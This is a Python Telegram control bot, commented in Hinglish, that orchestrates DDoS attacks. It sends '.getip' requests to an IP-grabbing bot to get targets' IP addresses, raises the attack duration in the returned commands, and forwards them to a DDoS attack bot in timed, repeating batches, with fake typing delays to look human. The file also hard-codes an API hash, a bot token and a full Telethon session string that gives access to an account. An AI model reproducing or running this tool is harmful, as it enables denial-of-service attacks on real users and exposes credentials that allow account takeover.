import asyncio
import re
import random
from typing import Dict, List, Set

from telethon import TelegramClient, events
from telethon.sessions import StringSession

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
)

# ===== TELETHON + BOT CONFIG (tumhare values) =====
API_ID = 35284354
API_HASH = "1369f6f5653d5589b735def06a23703c"
BOT_TOKEN = "8489391478:AAFn0e-HJplScgnrZ5YH0f2Gc8Q1KO9VeyQ"

BOT_A = "@botbysahilbot"          # IP BOT
BOT_B = "@DDOS_Aditya_xd_bot"     # Attack BOT


STRING_SESSION = "1BVtsOKEBuwrK8qxvmy15Glw3WMpdO6sLWyYPWJrT_srehGTLqvYQ-h79-TY6GRqf9JfkAHjjzeN2HK-EWRJBlZnep2DpbOSNaqnDGQr3vjlGK9HY42PNWQWopuw-NKZcFYkQkL5aTNmhLw9oIgj0Yv1dCxEVIsK1RlDz8MeV3gw3NOOBO_ugSSiNwQWm9p-LLxDNirZrGBHsPu6ldDZx3ugqYbjqq1lZqBX30-VA_iPxbe-tCfHAJYAuKFsgH17iB-Q5f4HsKYQWGqx2ifgnDXsZhbtlfj7SkU16c4GJzicV9fuKMcJLhjbC2Gt48chDdtShhyBilakU0beFCt4EhgyAxccsPUI="



tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)

# ===== STATE =====
saved_targets: Dict[int, List[str]] = {}     # har user ke saved chats
selected_indexes: Dict[int, Set[int]] = {}   # /listchats ke checkboxes
multi_targets: Dict[int, List[str]] = {}     # selected targets order me
chat_counts: Dict[int, int] = {}             # autoloop count

ip_waiters: Dict[int, asyncio.Future] = {}   # IP BOT reply wait
auto_tasks: Dict[int, asyncio.Task] = {}     # autoloop task per chat
BASE_DELAY = 65                          # fixed delay (s) autoloop ke liye


# ===== HELPERS =====
async def human_sleep(min_s: float, max_s: float):
    await asyncio.sleep(random.uniform(min_s, max_s))

async def human_type_and_send(context: ContextTypes.DEFAULT_TYPE, chat_id: int, text: str):
    t = min(5, max(0.7, len(text) * 0.03 + random.uniform(-0.3, 0.5)))
    await context.bot.send_chat_action(chat_id, "typing")
    await asyncio.sleep(t)
    await context.bot.send_message(chat_id, text)


# ===== TELETHON LISTENERS =====
@tele.on(events.NewMessage(from_users=BOT_A))
async def ip_bot_listener(event):
    text = event.text or ""
    print("📩 IP BOT REPLY:", repr(text))

    m_line = re.search(r"CMD:(.+)", text, flags=re.IGNORECASE)
    if not m_line:
        return

    line = m_line.group(1).strip()

    m_cmd = re.search(r"`([^`]+)`", line)
    if m_cmd:
        raw_cmd = m_cmd.group(1).strip()
    else:
        raw_cmd = line.lstrip("* ").strip()

    # last 2 chars ko 50 kar do (30 -> 50)
    if len(raw_cmd) >= 2:
        final_cmd = raw_cmd[:-2] + "50"
    else:
        final_cmd = raw_cmd

    print("✅ FINAL CMD:", final_cmd)

    await human_sleep(0.4, 1.2)

    # jo bhi control chat ip_wait kar raha hai use result do
    for chat_id, fut in list(ip_waiters.items()):
        if not fut.done():
            fut.set_result(final_cmd)
        ip_waiters.pop(chat_id, None)


@tele.on(events.NewMessage(from_users=BOT_B))
async def bot_b_listener(event):
    # optional: status track karna ho to yahan logic daal sakte ho
    text = event.text or ""
    print("DDOS BOT MSG:", repr(text))


# ===== CORE: SINGLE TARGET ROUND =====
async def single_round_for_target(
    control_chat_id: int,
    context: ContextTypes.DEFAULT_TYPE,
    target: str,
) -> str | None:
    """Ek target ke liye .getip, CMD return kare ya None."""
    await human_type_and_send(
        context,
        control_chat_id,
        f"➡️ `{target}` ka IP nikal raha hu…",
    )

    loop = asyncio.get_running_loop()
    fut = loop.create_future()
    ip_waiters[control_chat_id] = fut

    await human_sleep(0.8, 2.0)
    await tele.send_message(BOT_A, f".getip all {target}")

    try:
        final_cmd = await asyncio.wait_for(fut, timeout=60)
    except asyncio.TimeoutError:
        await human_type_and_send(
            context,
            control_chat_id,
            f"⏱️ `{target}` se reply nahi aaya, skip kar diya.",
        )
        ip_waiters.pop(control_chat_id, None)
        return None

    await human_type_and_send(
        context,
        control_chat_id,
        f"📥 CMD mila `{target}` ke liye:`{final_cmd}`",
    )
    return final_cmd


# ===== BATCH ROUND: MULTI‑TARGET QUEUE =====
async def batch_round(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    targets = multi_targets.get(chat_id, [])
    if not targets:
        await human_type_and_send(
            context,
            chat_id,
            "❌ Pehle /listchats khol ke buttons se targets select karo.",
        )
        return

    active_cmds: List[str] = []

    # 1) sab selected targets ke liye CMD collect karo
    for t in targets:
        cmd = await single_round_for_target(chat_id, context, t)
        if cmd:
            active_cmds.append(cmd)

    if not active_cmds:
        await human_type_and_send(
            context,
            chat_id,
            "❌ Koi bhi active group nahi mila.",
        )
        return

    # 2) CMDs ko line‑se BOT_B ko bhejna
    for i, cmd in enumerate(active_cmds, start=1):
        await human_type_and_send(
            context,
            chat_id,
            f"🚀 {i}/{len(active_cmds)}: DDOS BOT ko bhej raha hu:`{cmd}`",
        )
        await tele.send_message(BOT_B, cmd)
        await human_sleep(1.0, 3.0)


# ===== AUTO LOOP (batch_round ke upar) =====
async def autoloop_worker(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    count = chat_counts.get(chat_id, 1)

    await human_type_and_send(
        context,
        chat_id,
        f"🔁 Auto loop start kar raha hu. Rounds: {count} | Fixed delay: {BASE_DELAY}s.",
    )

    try:
        for i in range(count):
            await human_type_and_send(
                context,
                chat_id,
                f"▶️ Round {i + 1}/{count} shuru…",
            )

            await batch_round(chat_id, context)

            if i == count - 1:
                break

            await human_type_and_send(
                context,
                chat_id,
                f"⏳ Next round se pehle {BASE_DELAY}s wait karunga…",
            )
            await asyncio.sleep(BASE_DELAY)
    except asyncio.CancelledError:
        await human_type_and_send(
            context,
            chat_id,
            "🛑 Auto loop force stop ho gaya (stop command se).",
        )
        raise
    finally:
        auto_tasks.pop(chat_id, None)
        await human_type_and_send(context, chat_id, "✅ Auto loop khatam ho gaya.")


# ===== INLINE KEYBOARD HELPERS =====
def build_keyboard(chat_id: int) -> InlineKeyboardMarkup:
    lst = saved_targets.get(chat_id, [])
    sel = selected_indexes.setdefault(chat_id, set())
    keyboard: List[List[InlineKeyboardButton]] = []

    for i, _ in enumerate(lst, start=1):
        mark = "✅" if i in sel else "⬜"
        keyboard.append([
            InlineKeyboardButton(f"{mark} {i}", callback_data=f"toggle_{i}")
        ])

    keyboard.append([
        InlineKeyboardButton("🟩 Select all", callback_data="select_all"),
        InlineKeyboardButton("🚀 Start", callback_data="start_attack"),
    ])
    return InlineKeyboardMarkup(keyboard)


# ===== COMMAND HANDLERS =====
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = """
👋 Hey, main attack helper bot hu.

Commands:
/addchat <link_or_chatid>     - Target list me add karo
/listchats                    - Saved list + inline buttons
/setcount <rounds>            - Kitne rounds (batch)
/startloop                    - Ek batch round (current selection)
/autoloop                     - Multiple rounds with delay
/stoploop                     - Auto loop turant band karo
"""
    await human_type_and_send(context, update.effective_chat.id, text.strip())


async def addchat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not context.args:
        await update.message.reply_text("Usage: /addchat <group_link_or_chatid>")
        return

    target = " ".join(context.args).strip()
    saved_targets.setdefault(chat_id, [])

    if target in saved_targets[chat_id]:
        await update.message.reply_text("ℹ️ Ye chat/id pehle se list me hai.")
        return

    saved_targets[chat_id].append(target)
    await update.message.reply_text(f"✅ Added: `{target}`", parse_mode="Markdown")


async def listchats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    lst = saved_targets.get(chat_id, [])

    if not lst:
        await update.message.reply_text("📭 Abhi koi saved chat/id nahi hai. /addchat use karo.")
        return

    selected_indexes.setdefault(chat_id, set())

    lines = ["📚 Saved chats/IDs:"]
    for i, t in enumerate(lst, start=1):
        lines.append(f"{i}. {t}")

    text = "".join(lines)
    reply_markup = build_keyboard(chat_id)
    await update.message.reply_text(text, reply_markup=reply_markup)


async def on_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    chat_id = query.message.chat_id
    lst = saved_targets.get(chat_id, [])
    if not lst:
        await query.edit_message_reply_markup(reply_markup=None)
        return

    data = query.data
    sel = selected_indexes.setdefault(chat_id, set())

    if data.startswith("toggle_"):
        idx = int(data.split("_")[1])
        if 1 <= idx <= len(lst):
            if idx in sel:
                sel.remove(idx)
            else:
                sel.add(idx)

    elif data == "select_all":
        if len(sel) == len(lst):
            sel.clear()
        else:
            sel.update(range(1, len(lst) + 1))

    elif data == "start_attack":
        if not sel:
            await query.answer("Koi chat select nahi ki.", show_alert=True)
            return

        targets = [lst[i - 1] for i in sorted(sel)]
        multi_targets[chat_id] = targets

        await query.message.reply_text(
            "🎯 Selected targets:" + "".join(f"- {t}" for t in targets)
        )
        # ek batch round abhi turant chalao
        asyncio.create_task(batch_round(chat_id, context))
        return  # keyboard as-it-is rahe

    # toggle / select_all ke liye keyboard redraw
    reply_markup = build_keyboard(chat_id)
    await query.edit_message_reply_markup(reply_markup=reply_markup)


async def setcount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /setcount <rounds>")
        return
    n = max(1, int(context.args[0]))
    chat_counts[update.effective_chat.id] = n
    await human_type_and_send(context, update.effective_chat.id, f"✅ Rounds set: {n}")


async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await batch_round(update.effective_chat.id, context)


async def autoloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    if chat_id in auto_tasks:
        await update.message.reply_text("⚠️ Auto loop already chal raha hai.")
        return

    task = asyncio.create_task(autoloop_worker(chat_id, context))
    auto_tasks[chat_id] = task
    await update.message.reply_text("🔁 Auto loop task start kar diya.")


async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    task = auto_tasks.get(chat_id)

    if task:
        task.cancel()
        await update.message.reply_text(
            "🛑 Stop signal bhej diya, thodi der me loop band ho jayega."
        )
    else:
        await update.message.reply_text("ℹ️ Is chat me koi auto loop nahi chal raha.")


# ===== MAIN (jo pehle se kaam kar raha tha) =====
async def main():
    await tele.start()
    print("🧵 Telethon connected")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("addchat", addchat))
    app.add_handler(CommandHandler("listchats", listchats))
    app.add_handler(CommandHandler("setcount", setcount))
    app.add_handler(CommandHandler("startloop", startloop))
    app.add_handler(CommandHandler("autoloop", autoloop))
    app.add_handler(CommandHandler("stoploop", stoploop))
    app.add_handler(CallbackQueryHandler(on_list_callback))

    print("🤖 Control bot running")
    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    await tele.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())